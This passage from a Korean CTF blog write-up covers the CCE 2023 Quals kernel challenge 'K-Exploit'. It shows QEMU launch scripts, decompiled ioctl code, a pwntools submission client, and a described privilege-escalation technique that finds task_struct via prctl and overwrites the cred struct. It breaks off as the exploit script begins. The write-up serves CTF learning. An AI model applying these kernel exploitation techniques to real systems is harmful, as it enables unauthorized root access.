            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      CCE 2023 Quals
    </h1>
    <div class="post-meta">


June 2023

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#k-exploit" aria-label="K-Exploit">K-Exploit</a><ul>
                        
                <li>
                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
                        
                <li>
                    <a href="#local_runsh" aria-label="local_run.sh">local_run.sh</a></li>
                <li>
                    <a href="#server_runsh" aria-label="server_run.sh">server_run.sh</a></li>
                <li>
                    <a href="#k-exploitko" aria-label="k-exploit.ko">k-exploit.ko</a></li></ul>
                </li>
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#n0t_rand0m" aria-label="n0t_rand0m">n0t_rand0m</a><ul>
                        
                <li>
                    <a href="#analysis-1" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation-1" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-1" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#fit" aria-label="Fit">Fit</a><ul>
                        
                <li>
                    <a href="#analysis-2" aria-label="Analysis">Analysis</a></li>
                <li>
                    <a href="#exploitation-2" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-2" aria-label="Exploit script">Exploit script</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#babykernel" aria-label="babykernel">babykernel</a><ul>
                        
                <li>
                    <a href="#analysis-3" aria-label="Analysis">Analysis</a><ul>
                        
                <li>
                    <a href="#local_runsh-1" aria-label="local_run.sh">local_run.sh</a></li>
                <li>
                    <a href="#babykernelko" aria-label="babykernel.ko">babykernel.ko</a></li></ul>
                </li>
                <li>
                    <a href="#exploitation-3" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script-3" aria-label="Exploit script">Exploit script</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="k-exploit">K-Exploit<a hidden class="anchor" aria-hidden="true" href="#k-exploit">#</a></h1>
<p>처음으로 잡아본 커널 문제다.
대회끝나고 50분뒤에 플래그가 나왔다.
아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;</p>
<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
<p>rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.</p>
<h3 id="local_runsh">local_run.sh<a hidden class="anchor" aria-hidden="true" href="#local_runsh">#</a></h3>
<pre tabindex="0"><code>#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel bzImage \
    -initrd rootfs.img.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; \
    -s
</code></pre><p>kaslr, kpti, smep, smap 다 빡세게 걸려있다.</p>
<h3 id="server_runsh">server_run.sh<a hidden class="anchor" aria-hidden="true" href="#server_runsh">#</a></h3>
<pre tabindex="0"><code>#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel bzImage \
    -initrd $1 \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;
</code></pre><p>똑같은데 디버깅 옵션만 빠진거같다.</p>
<h3 id="k-exploitko">k-exploit.ko<a hidden class="anchor" aria-hidden="true" href="#k-exploitko">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">_fentry__</span>(flip, cmd);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">copy_from_user</span>(index, usr_, <span style="color:#ae81ff">0x20LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (_DWORD)cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10002</span> )                 <span style="color:#75715e">// modify
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x28</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_ubsan_handle_out_of_bounds</span>(<span style="color:#f92672">&amp;</span>off_BA0, idx);
</span></span><span style="display:flex;"><span>    v11 <span style="color:#f92672">=</span> arr[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v11 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    cnt <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sz <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)arr[idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    from_ <span style="color:#f92672">=</span> src;
</span></span><span style="display:flex;"><span>    to_ <span style="color:#f92672">=</span> v11 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> off;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_26;                              <span style="color:#75715e">// copy_from_user(to_, from_, cnt);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span></code></pre></div><p>ioctl로 modify 할 수 있다.
구조체를 userland에서 받아서 그걸 바탕으로 처리를 진행한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)cmd <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10002</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (_DWORD)cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10003</span> )               <span style="color:#75715e">// CREATE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>      v15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x28</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_ubsan_handle_out_of_bounds</span>(<span style="color:#f92672">&amp;</span>off_B80, v15);
</span></span><span style="display:flex;"><span>      v6 <span style="color:#f92672">=</span> arr[v15];
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v6 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xA0</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        to <span style="color:#f92672">=</span> <span style="color:#a6e22e">_kmalloc</span>(sz, <span style="color:#ae81ff">0x6000C0LL</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( to )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          arr[v15] <span style="color:#f92672">=</span> to;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">copy_from_user</span>(to, src, sz);
</span></span><span style="display:flex;"><span>          arr[v15 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>kmalloc을 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> ( (_DWORD)cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10004</span> )          <span style="color:#75715e">// DELETE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x28</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_ubsan_handle_out_of_bounds</span>(<span style="color:#f92672">&amp;</span>off_B60, v4);
</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">=</span> arr[v4];
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v5 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>(v5);
</span></span><span style="display:flex;"><span>        arr[v4] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> v6;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>얘는 kfree하는데 사용한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (_DWORD)cmd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x1337</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (_DWORD)cmd <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x10001</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x28</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_ubsan_handle_out_of_bounds</span>(<span style="color:#f92672">&amp;</span>off_BC0, v8);
</span></span><span style="display:flex;"><span>    usr <span style="color:#f92672">=</span> arr[v8];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>usr )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sz <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)arr[v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">copy_to_user</span>(src, usr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> off);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v17 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)index) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x27</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_ubsan_handle_out_of_bounds</span>(<span style="color:#f92672">&amp;</span>off_B40, v17);
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> arr[v17];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v6 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    cnt <span style="color:#f92672">=</span> sz;
</span></span><span style="display:flex;"><span>    from_ <span style="color:#f92672">=</span> src;
</span></span><span style="display:flex;"><span>    to_ <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(v6 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> off);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>LABEL_26:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">copy_from_user</span>(to_, from_, cnt);
</span></span></code></pre></div><p>0x1337은 포인터 참조 두번하고 userland의 데이터로 덮는다.
0x1001은 메모리를 읽어주고 userland로 돌려준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>REMOTE_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;20.196.194.8&#34;</span>
</span></span><span style="display:flex;"><span>REMOTE_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXPLOIT_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;??&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(REMOTE_IP, REMOTE_PORT)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solvepow</span>(x, target):
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(x)
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(target)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span><span style="color:#f92672">**</span><span style="color:#ae81ff">3</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>md5(x <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;big&#34;</span>))<span style="color:#f92672">.</span>digest() <span style="color:#f92672">==</span> target:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> x<span style="color:#f92672">.</span>hex()<span style="color:#f92672">+</span>hex(i)[<span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    line <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;= &#34;</span>)[<span style="color:#ae81ff">1</span>][:<span style="color:#ae81ff">26</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;= &#34;</span>)[<span style="color:#ae81ff">2</span>][:<span style="color:#ae81ff">32</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(bytes(solvepow(x, target), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;link</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./a.out&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(data)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># io.sendline(EXPLOIT_URL)</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>이거 때문에 브포하기 힘들다.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<pre tabindex="0"><code>~ # cat /proc/slabinfo | grep cred
cred_jar             105    105    192   21    1 : tunables    0    0    0 : slabdata      5      5      0  
</code></pre><p>slab info 확인해서 cred 크기 확인해보면, 0xc0이라서 잘 맞추고 스프레이하고 인접한 cred를 덮으려고 했는데 막혀있다.
UAF도 불가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sz <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)arr[idx <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    from_ <span style="color:#f92672">=</span> src;
</span></span><span style="display:flex;"><span>    to_ <span style="color:#f92672">=</span> v11 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> off;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_26;                              <span style="color:#75715e">// copy_from_user(to_, from_, cnt);
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sz <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)arr[v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)sz <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x7FFFFFFF</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">copy_to_user</span>(src, usr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> off);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span></code></pre></div><p>off 검증이 없다.
원래 0x1337이나 0x1001도 있는데 어떤 곳에 사용해야할지 잘 모르겠고 시간도 부족해서, 간단하게 fork로 cred 구조체 heap spraying 하고 브포했다.
생각보다 엔트로피가 그렇게 크지 않아보여서 시도해봤는데, 막상 remote로 보낼때 pow_client.py 때문에 브포하기 힘들었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#75715e">/* Effective (overridable) subjective task credentials (COW): */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>cred;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef CONFIG_KEYS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* Cached requested key. */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> key			<span style="color:#f92672">*</span>cached_requested_key;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * executable name, excluding path.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 *
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * - normally initialized setup_new_exec()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * - access it with [gs]et_task_comm()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * - lock it with task_lock()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span>				comm[TASK_COMM_LEN];
</span></span></code></pre></div><p>출제자분의 라이트업에서는 task_struct를 찾기 위해서 prctl PR_SET_NAME으로 이름을 바꿔주고 0x1001로 메모리를 읽으면서 그 문자열 위치를 탐색하고 문자열 위치 - 0x10 위치에 cred 구조체 포인터가 있으니까 0x1337로 참조해서 익스했다.</p>
<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;fcntl.h&gt;</span>
